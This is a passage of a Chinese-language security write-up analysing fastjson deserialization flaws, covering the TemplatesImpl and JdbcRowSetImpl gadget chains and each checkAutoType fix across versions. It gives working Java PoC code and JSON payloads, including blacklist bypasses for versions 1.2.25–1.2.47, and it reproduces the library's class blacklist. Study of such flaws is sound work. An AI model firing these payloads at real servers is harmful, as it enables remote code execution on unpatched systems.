    for (int i = 0; i  String PoC经过JSON.parseObject序列化后约为(因为设置不了私有属性的缘故，这里定义了一个setFieldValue方法模拟)：
>  
>  
>     public class Poc {
>       public static void setFieldValue(Object obj, String fieldName, Object
> value) throws Exception {
>          Field field = obj.getClass().getDeclaredField(fieldName);
>          field.setAccessible(true);
>          field.set(obj, value);
>      }
>     ​
>      public static void main(String[] args) throws Exception {
>          TemplatesImpl obj = new TemplatesImpl();
>          setFieldValue(obj, "_bytecodes", new byte[][] {evil});//evil为恶意字节码
>          setFieldValue(obj, "_name", "a.b");
>          setFieldValue(obj, "_tfactory", {});//
>           setFieldValue(obj,"_outputProperties",{});
>      }
>     }
>  
`_tfactory`也可以传入new
TransformerFactoryImpl()，_tyfactory为空的话会根据类属性自动创建TransformerFactoryImpl实例，但是只有用fastjson/serializer进行序列化的时候可以不传入
因为有去除下划线的操作，属性都能加上`_`。指定了allowedProtocols=all，也就是序列化支持的协议
弹计算器图：
关于fastjson反序列化调用javaBean的setter、getter、构造函数请看
  * 源码大致原理:
json序列化入口：JSON.parseObject(),转到DefaultJSONParser.parseObject(),该方法下的一个if判断，key==`JSON.DEFAULT_TYPE_KEY`
同时 没有开启`Feature.DisableSpecialKeyDetect` 就会进入判断，利用loadClass，加载类对象
ParserConfig.getDeserializer()经过一系列的判断，由于TemplatesImpl类都不在if判断的条件范围内，所以会创建一个`JavaBeanDeserializer`。都获取到了对应的反序列化器之后，正式开始进行反序列化。
`JavaBeanDeserializer.parseField()` 方法中利用smartMatch对我们传入的属性进行了模糊匹配
然后调用`getFieldDeserializer`，在`sortedFieldDeserializers`
中找到`getOutputProperties` 方法，并且进行返回
然后调用反射触发getOutputProperties,进而转到TemplatesImpl链
#### fastjson1.2.24修复
在DefaultJSONParser.parseObject中将加载类的`TypeUtils.loadClass`方法替换为了`this.config.checkAutoType()`方法。并在此方法增加了白名单+黑名单，以下类传入parseObject都会被禁
    bsh
    com.mchange
    com.sun.
    java.lang.Thread
    java.net.Socket
    java.rmi
    javax.xml
    org.apache.bcel
    org.apache.commons.beanutils
    org.apache.commons.collections.Transformer
    org.apache.commons.collections.functors
    org.apache.commons.collections4.comparators
    org.apache.commons.fileupload
    org.apache.myfaces.context.servlet
    org.apache.tomcat
    org.apache.wicket.util
    org.codehaus.groovy.runtime
    org.hibernate
    org.jboss
    org.mozilla.javascript
    org.python.core
    org.springframework
## fastjson jdbcRowSetImpl链
版本：fastjson 1.TemplatesImpl 链
>
>   * 优点：当fastjson不出网的时候可以直接进行盲打（配合时延的命令来判断命令是否执行成功）
>   * 缺点：版本限制 1.2.22 起才有 SupportNonPublicField
> 特性，并且后端开发需要特定语句才能够触发，在使用parseObject 的时候，必须要使用 JSON.parseObject(input,
> Object.class, Feature.SupportNonPublicField)
>
>
> 2.JdbcRowSetImpl 链
>
>   * 优点：利用范围更广，触发更为容易
>   * 缺点：当fastjson
> 不出网的话这个方法基本上不行（在实际过程中遇到了很多不出网的情况）同时高版本jdk中codebase默认为true，这样意味着，我们只能加载受信任的地址
>
## fastjson后续修复
  1. 自从1.2.25 起 autotype 默认关闭
  2. 增加 checkAutoType 方法，在该方法中扩充黑名单，同时增加白名单机制
黑名单扩充了：
    "bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework"
  * 1.2.25-1.2.41 poc
由于autotype默认关闭，在poc之前开启autotype:
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
在新增的checkAutoType，指向的TypeUtils.loadClass()方法对传入类进行了过滤，开头为`[` or
开头为`L`结尾为`;`会去除
poc：`{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\",
\"dataSourceName\":\"rmi://127.0.0.1:1099/refObj\", \"autoCommit\":true}`
由于`L`开头无法加载类，这里只能用`[`
  * 1.2.42 poc
在该fastjson版本，将checkAutoType换为了hash校验，对类的第一位和最后一位进行哈希（第一位为`L`,最后一位为`;`），这里只去除了一次，可以双写
将方法hash后与denyHashCodes（黑名单hash表）对比
看起来修复了，其实加密hash所用的算法能通过源码看到：
将类添加至字典addDeny: 可以看到使用的加密方法为`TypeUtils.fnv1a_64()`
fnv1a_64():
github项目，用hash碰撞求出黑名单hash对应的类：
poc也只用加双写`L ;`
    {"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;", "dataSourceName":"rmi://127.0.0.1:1099/refObj", "autoCommit":true}
1.2.43修复：对双写进行了过滤
1.2.45修复：扩充黑名单
## fastjson1.2.25-1.2.47通杀
POC：
    {
        "a":{
            "@type":"java.lang.Class",
            "val":"com.sun.rowset.JdbcRowSetImpl"
        },
        "b":{
            "@type":"com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName":"rmi://localhost:1099/refObj",
            "autoCommit":true
        }
    }
该poc无视checkAutoType，还记得checkAutoType里将方法hash与黑名单hash对比吗，&&后面还加入了`getClassFromMapping()==null`判断
  * 源码分析：
DefaultJSONParser#parser中调用了MiscCodec#deserialze方法
在MiscCodec中对类进行了判断，如果为java.lang.Class类，会调用TypeUtils#loadClass来加载恶意类，所以传入类需要为java.lang.Class
在不传入java.lang.Class的loadClass:
可以看到cache值为false
在MiscCodec中调用的loadClass并未传入cache值，而该值默认true。所以顺利进入if(cache)判断里，将(className,clazz)
put进mappings。
这个时候回到最开始的`getClassFromMapping()==null`，返回false，就绕过了黑名单检测
1.2.48修复：将cache默认设置为false
参考：